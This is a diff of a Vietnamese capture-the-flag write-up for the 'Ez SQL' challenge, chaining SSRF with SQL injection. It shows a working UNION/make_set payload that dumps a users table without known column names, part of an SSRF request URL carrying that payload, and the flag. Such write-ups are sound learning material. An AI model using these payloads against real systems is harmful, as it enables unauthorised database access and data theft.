@@ -1,6 +1,6 @@
 # Ez SQL
 
-Bài này là SSRF + SQLi.
+Bài này là một chall sử dụng SSRF và SQLi khá hay nên mình note lại để học tập :Đ
 
 ## SQLi
 
@@ -18,7 +18,7 @@ Mình tải source về build lại, xoá đoạn check phía trên đi và th�
 1 union select 1,make_set(1|4,`2`,`3`,`4`)from(select 1,2,3,4 union select * from users)a
 ```
 
-Do không tìm được tên cột nên mình sử dụng `select 1,2,3,4 union select * from users` để tạo table mới từ table `users` với các cột có tên là `1`, `2`, `3` và `4` sau đó dùng `make_set` để ghép các cột lại với nhau thành 1 cột duy nhất.
+Do không tìm được tên cột nên mình sử dụng `select 1,2,3,4 union select * from users` để tạo table mới từ table `users` với các cột có tên là `1`, `2`, `3` và `4` sau đó dùng `make_set` để ghép cột 1 và cột 3 lại với nhau thành một cột duy nhất.
 
 Phần SQLi đã xong, việc còn lại cần làm là bypass SSRF.
 
@@ -55,3 +55,7 @@ http://meo.tg3xz1mm.requestrepo.com/home.php?id=1%20union%20select%201,make_set(
 ```
 
 Flag: `ISITDTU{w0w_SSRF_ch4in_SQLI_3Zzzz_h3he_!!!!}`
+
+#
+
+Đoạn payload `union select xxx` tuyệt vời trên mình có tham khảo của anh `taidh` <3
